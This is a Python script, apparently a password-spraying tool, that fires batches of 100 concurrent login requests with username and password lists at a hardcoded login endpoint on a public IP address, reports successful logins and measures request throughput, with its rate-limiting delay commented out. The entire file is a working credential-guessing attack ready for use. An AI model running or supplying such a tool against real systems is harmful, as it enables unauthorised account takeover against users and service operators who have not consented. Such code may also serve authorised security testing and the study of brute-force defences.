import asyncio
import aiohttp
import os
import time

url = 'http://54.234.124.97:5050/login'
BATCH_SIZE = 100  # Number of requests per batch

# Function to send a login request
async def send_login_request(session, username, password):
    try:
        async with session.post(url, json={'username': username, 'password': password}) as response:
            status = response.status
            text = await response.text()
            if status == 200:
                print(f'[+] Success! Response for {username}:{password} - {text} - {status}')
            # else:
                # print(f'[-] Failed! Response for {username}:{password} - {text} - {status}')
    except Exception as error:
        print(f'Request failed for {username}:{password} - {error}')

# Function to send requests in batches and measure performance
async def send_requests_in_batches(session, username_password_pairs):
    batch_times = []  # List to store the time taken for each batch

    for i in range(0, len(username_password_pairs), BATCH_SIZE):
        batch_pairs = username_password_pairs[i:i + BATCH_SIZE]

        # Start timer for this batch
        batch_start_time = time.time()

        # Create batch of login requests
        batch_requests = [
            send_login_request(session, username, password)
            for username, password in batch_pairs
        ]

        # Send batch and wait for completion
        await asyncio.gather(*batch_requests)

        # Calculate time taken for the batch
        batch_time = time.time() - batch_start_time
        batch_times.append(batch_time)

        # Add a 1-second delay after each batch
        # await asyncio.sleep(1)
        # print(f'Sent batch of {len(batch_requests)} requests in {batch_time:.2f} seconds.')

    total_requests = len(username_password_pairs)
    total_time = sum(batch_times)
    requests_per_second = total_requests / total_time if total_time > 0 else 0

    # Final message format
    print(f"\nBatch Size: {BATCH_SIZE}, Time taken: {total_time:.2f} seconds, Requests per second: {requests_per_second:.2f}")

# Function to perform the password spray
async def password_spray(usernames, passwords):
    username_password_pairs = [(username, password) for username in usernames for password in passwords]

    async with aiohttp.ClientSession() as session:
        await send_requests_in_batches(session, username_password_pairs)

# Function to read usernames and passwords from files
def read_usernames(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Run the password spray
if __name__ == "__main__":
    # Get the directory of the current script
    base_dir = os.path.dirname(os.path.abspath(__file__))

    # Set file paths for usernames and passwords
    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top_1000_usernames.txt')
    password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')

    # Read usernames and passwords
    usernames = read_usernames(username_file_path)
    passwords = read_passwords(password_file_path)

    print(f"Total login attempts to make: {len(usernames) * len(passwords)}")

    # Run the password spray and calculate performance
    asyncio.run(password_spray(usernames, passwords))


